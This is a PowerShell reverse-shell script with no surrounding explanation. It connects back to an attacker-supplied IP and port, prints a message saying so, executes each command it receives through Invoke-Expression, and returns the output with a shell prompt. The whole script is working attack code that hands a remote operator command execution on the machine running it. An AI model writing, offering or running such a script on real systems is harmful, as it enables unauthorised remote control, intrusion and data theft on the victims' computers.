$listener_ip = $args[0]
$listener_port = $args[1]
Write-Host "[*] Connecting back to the attacker at $listener_ip:$listener_port..."
$tcpClient = New-Object System.Net.Sockets.TcpClient($listener_ip, $listener_port)
$stream = $tcpClient.GetStream()
[byte[]]$buffer = 0..255|%{0}
while ($true) {
    $i = 0
    while ($i -lt 255) {
        $i = $stream.Read($buffer, 0, $buffer.Length)
        if ($i -gt 0) {
            $data = (New-Object Text.ASCIIEncoding).GetString($buffer, 0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2 = $sendback + "PS " + (pwd).Path + "> "
            $sendback = [text.encoding]::ASCII.GetBytes($sendback2)
            $stream.Write($sendback, 0, $sendback.Length)
            $stream.Flush()
        }
    }
}
